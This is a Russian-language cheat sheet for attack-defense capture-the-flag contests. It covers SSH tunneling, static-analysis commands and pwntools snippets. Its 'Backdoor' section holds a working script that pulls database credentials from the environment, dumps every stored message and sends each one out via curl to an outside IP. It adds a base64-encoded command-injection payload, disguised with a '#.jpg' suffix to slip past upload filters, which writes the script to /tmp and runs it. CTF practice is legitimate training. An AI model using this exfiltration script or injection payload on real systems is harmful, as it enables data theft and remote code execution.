
# **SSH Tunneling**

**ДЛЯ A&D:**
Cоздаю туннель через drop@spbctf.bbctf.ru 
При подключении на drop@spbctf.bbctf.ru на порт 3231 трафик ssh будет перенаправлен на вулнбокс 7.7.7.1:22

```bash
ssh -NfR 0.0.0.0:3231:7.7.7.1:22 drop@spbctf.bbctf.ru
```


**ДЛЯ ЛЮБОГО ТУННЕЛЯ:**
Теперь через порт 1080 нам доступны все сервисы сервера root@45.95.235.23
Для этого нужно подключиться через прокси на 1080, либо: 

curl --socks5-hostname localhost:1080 "http://[fd66:666:325::2]:3000/"
```bash
ssh -NfD 1080 root@45.95.235.23
```

# **ПОИСК УЯЗ**

## Оглавление
- [[#Статический анализ]]
  - [[#1) PT Application Inspector (VS Code Plagin)]]
  - [[#2) SemGrep]]
  - [[#3) Bandit]]
- [[#requests]]
- [[#pwntools]]

---

## Статический анализ

### 1) PT Application Inspector (VS Code Plagin)

### 2) SemGrep

```bash
semgrep scan
```

```bash
semgrep scan --config=p/security-audit
```

```bash
semgrep scan --config=p/best-practices
```

```bash
semgrep scan --config=p/python
```

### 3) Bandit

```bash
bandit -r .
```

```bash
bandit my_script.py
```

```bash
bandit -r . -ll
```


# **Cплойтинг**

1) Подключение `redlib`

## requests

```python
s = requests.Session()

s.get()
s.post()
```


## pwntools

```python
io = start()
io.close()

io.send("reg\n")
io.recvuntil("# ")
io.recvline()
```


# Backdoor

Сам скрипт
```python
import psycopg2
from urllib.parse import urlparse
import os
import base64

database_url = os.getenv("DATABASE_URL")

p = urlparse(database_url)

pg_connection_dict = {
    'dbname': p.path[1:],
    'user': p.username,
    'password': p.password,
    'port': p.port,
    'host': p.hostname
}
print(pg_connection_dict)
con = psycopg2.connect(**pg_connection_dict)
cur = con.cursor()
cur.execute("SELECT text FROM messages;")
flags = cur.fetchall()
flags = [x[0] for x in flags]
print(flags)

for flag in flags:
	os.popen(f'curl -s "http://172.31.135.145/flag?teamid=t05&flag={flag}"')
```

Как можно закинуть:
```python
; echo 'aW1wb3J0IHBzeWNvcGcyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZQppbXBvcnQgb3MKaW1wb3J0IGJhc2U2NAoKZGF0YWJhc2VfdXJsID0gb3MuZ2V0ZW52KCJEQVRBQkFTRV9VUkwiKQoKcCA9IHVybHBhcnNlKGRhdGFiYXNlX3VybCkKCnBnX2Nvbm5lY3Rpb25fZGljdCA9IHsKICAgICdkYm5hbWUnOiBwLnBhdGhbMTpdLAogICAgJ3VzZXInOiBwLnVzZXJuYW1lLAogICAgJ3Bhc3N3b3JkJzogcC5wYXNzd29yZCwKICAgICdwb3J0JzogcC5wb3J0LAogICAgJ2hvc3QnOiBwLmhvc3RuYW1lCn0KcHJpbnQocGdfY29ubmVjdGlvbl9kaWN0KQoKY29uID0gcHN5Y29wZzIuY29ubmVjdCgqKnBnX2Nvbm5lY3Rpb25fZGljdCkKY3VyID0gY29uLmN1cnNvcigpCmN1ci5leGVjdXRlKCJTRUxFQ1QgdGV4dCBGUk9NIG1lc3NhZ2VzOyIpCmZsYWdzID0gY3VyLmZldGNoYWxsKCkKZmxhZ3MgPSBbeFswXSBmb3IgeCBpbiBmbGFnc10KcHJpbnQoZmxhZ3MpCgpmb3IgZmxhZyBpbiBmbGFnczoKCW9zLnBvcGVuKGYnY3VybCAtcyAiaHR0cDovLzE3Mi4zMS4xMzUuMTQ1L2ZsYWc/dGVhbWlkPXQwNSZmbGFnPXtmbGFnfSInKQo=' | base64 -d > /tmp/volk.py; python3 /tmp/volk.py #.jpg ( #.jpg - Обход загрузки изображений)
```